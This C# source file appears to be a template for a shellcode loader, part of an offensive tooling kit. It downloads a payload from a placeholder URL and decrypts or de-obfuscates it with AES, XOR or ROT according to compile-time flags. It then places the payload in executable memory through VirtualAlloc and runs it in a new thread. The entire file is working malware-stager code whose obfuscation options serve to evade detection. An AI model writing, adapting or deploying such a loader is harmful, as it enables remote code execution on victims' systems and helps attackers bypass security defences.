using System;
using System.Runtime.InteropServices;
#if AES
using System.Security.Cryptography;
#endif

namespace Craft
{
    public class Program
    {
        public const uint EXECUTEREADWRITE  = 0x40;
        public const uint COMMIT_RESERVE = 0x3000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void Main()
        {
            System.Net.WebClient client = new System.Net.WebClient();
            byte[] buf = client.DownloadData("{{URL}}");

#if AES
            byte[] key = new byte[] {{KEY}};
            byte[] iv = new byte[] {{IV}};

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV  = iv;
                aes.Padding = PaddingMode.PKCS7;
                using (ICryptoTransform decryptor = aes.CreateDecryptor())
                {
                    buf = decryptor.TransformFinalBlock(buf, 0, buf.Length);
                }
            }
#elif XOR
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)((uint)buf[i] ^ {{KEY}});
            }
#elif ROT
            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - {{KEY}}) & 0xFF);
            }            
#endif
        
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, COMMIT_RESERVE, EXECUTEREADWRITE);
            Marshal.Copy(buf, 0, addr, buf.Length);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}